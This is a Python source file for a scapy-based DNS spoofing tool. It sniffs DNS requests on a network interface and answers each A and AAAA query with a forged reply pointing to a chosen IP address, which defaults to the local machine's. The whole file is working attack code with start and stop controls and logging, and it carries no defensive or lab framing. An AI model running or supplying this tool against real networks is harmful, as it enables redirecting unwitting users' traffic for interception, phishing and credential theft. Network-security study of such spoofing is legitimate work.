from scapy.all import *

class DNSSpoofer:
    """
    DNS Spoofer class
    Creating:
        Always provide an interface if possible, otherwise it will pick the scapy default.
        new_dns_ip and new_dns_ip6 are the ip addresses that any spoofed DNS record will point towards.
        These do not have to be given if the spoofed ip is the ip of the current machine.
    Starting:
        Just call the start() method
    Stopping:
        Just call the stop() method. Calling this before start() does nothing.
    """

    def __init__(self, interface: str = conf.iface, new_dns_ip: str = '', new_dns_ip6: str = '') -> None:
        self.interface = interface
        self.new_dns_ip = new_dns_ip if new_dns_ip else get_if_addr(interface)
        self.new_dns_ip6 = new_dns_ip6 if new_dns_ip6 else get_if_addr6(interface)
    
    def isSupportedType(self, id: int) -> bool:
        return (
            (id == 1 and self.new_dns_ip) or    # A
            (id == 28 and self.new_dns_ip6)     # AAAA
        )

    def recordTypeIdToName(self, id: int) -> str:
        """
        Convert type ID to name for readability
        For now, only common onces are included
        https://en.wikipedia.org/wiki/List_of_DNS_record_types
        """
        typeMap = {
            1: 'A',
            28: 'AAAA',
            5: 'CNAME',
            39: 'DNAME',
            15: 'MX',
            33: 'SRV',
            16: 'TXT'
        }

        if id in typeMap:
            return typeMap[id]
        else:
            return str(id)

    def isIncoming(self, pkt: Packet) -> bool:
        """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
        return pkt[Ether].src != get_if_hwaddr(self.interface)

    def get_spoof_packet(self, req_pkt: Packet, name: str, recordType: str) -> Packet:
        """Generate one spoofed DNS response packet in response to a particular request"""
        res_pkt: Packet = (
            IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) /
            UDP(sport=req_pkt[IP].dport, dport=req_pkt[IP].sport)
        )

        if recordType == 1:
            # type: A
            res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip))
            print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip}')
        elif recordType == 28:
            # type: AAAA
            res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip6))
            print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip6}')


        return res_pkt

    def spoof_dns_request(self, pkt: Packet) -> None:
        """For a sniffed DNS packet, generate and send spoofed DNS responses for each requested record"""
        if pkt and DNS in pkt and IP in pkt and Ether in pkt:
            for i in range(int(pkt[DNS].qdcount)):
                # qdcount = the number of requested records
                name = pkt[DNS].qd[i].qname
                recordType = pkt[DNS].qd[i].qtype
                print(f'Received DNS request from {pkt[IP].src} for {name} of type {self.recordTypeIdToName(recordType)}')
                if self.isSupportedType(recordType):
                    res_pkt = self.get_spoof_packet(pkt, name, recordType)
                    send(res_pkt, iface=self.interface, verbose=False)
                else:
                    print('Type not supported, ignoring...')
    
    def start(self) -> None:
        """Start an asynchronous sniffer, use the stop() method to stop this"""
        self.sniffer = AsyncSniffer(iface=self.interface, prn=self.spoof_dns_request, lfilter=self.isIncoming, store=False)
        self.sniffer.start()
        print("DNS spoofing started")

    def stop(self) -> None:
        """Stop the async sniffer"""
        if self.sniffer:
            self.sniffer.stop()
            print("DNS spoofing stopped")
        else:
            print('DNS spoofing has to be started, before it can be stopped')
